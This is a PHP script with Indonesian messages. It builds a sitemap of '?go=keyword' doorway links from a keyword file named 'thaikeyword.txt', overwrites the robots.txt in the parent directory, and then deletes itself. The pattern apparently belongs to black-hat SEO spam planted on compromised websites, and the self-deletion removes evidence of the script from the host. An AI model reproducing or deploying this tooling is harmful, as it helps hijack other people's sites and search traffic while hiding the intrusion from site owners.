<?php

function getFileRowCount($filename)
{
    if (!file_exists($filename) || !is_readable($filename)) {
        return 0; // Return 0 if the file is not accessible
    }

    $file = fopen($filename, "r");
    $rowCount = 0;

    while (!feof($file)) {
        fgets($file);
        $rowCount++;
    }

    fclose($file);

    return $rowCount;
}

function generateRobotsTxt($baseUrl)
{
    $robotsContent = "User-agent: *" . PHP_EOL;
    $robotsContent .= "Disallow:" . PHP_EOL;
    $robotsContent .= PHP_EOL;
    $robotsContent .= "Sitemap: " . htmlspecialchars($baseUrl . "sitemap.xml") . PHP_EOL;

    // Save robots.txt one folder up, ensuring the directory exists
    $robotsPath = realpath(dirname(__FILE__) . "/../") . "/robots.txt";
    file_put_contents($robotsPath, $robotsContent);
}

function getBaseUrl()
{
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    return $protocol . "://" . $_SERVER['HTTP_HOST'];
}

$fullUrl = getBaseUrl() . $_SERVER['REQUEST_URI'];

if (!empty($fullUrl)) {
    $baseUrl = str_replace("program.php", "", $fullUrl);
    
    $judulFile = "thaikeyword.txt";
    $sitemapFile = fopen("sitemap.xml", "w");
    
    if ($sitemapFile) {
        fwrite($sitemapFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
        fwrite($sitemapFile, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);
        
        $fileLines = file($judulFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($fileLines as $judul) {
            $judulPlus = str_replace(' ', '+', htmlspecialchars($judul));
            $sitemapLink = htmlspecialchars($baseUrl . '?go=' . $judulPlus);
            fwrite($sitemapFile, '  <url>' . PHP_EOL);
            fwrite($sitemapFile, '    <loc>' . $sitemapLink . '</loc>' . PHP_EOL);
            fwrite($sitemapFile, '  </url>' . PHP_EOL);
        }

        fwrite($sitemapFile, '</urlset>' . PHP_EOL);
        fclose($sitemapFile);

        // Generate robots.txt in the parent folder
        generateRobotsTxt($baseUrl);

        echo "Pembuatan robots.txt dan sitemap.xml selesai.";
        unlink(__FILE__);
    } else {
        echo "Gagal membuka sitemap.xml untuk penulisan.";
    }

    // Instead of unlinking, you can just exit or disable further execution
    // exit();
} else {
    echo "URL saat ini tidak didefinisikan.";
}

?>
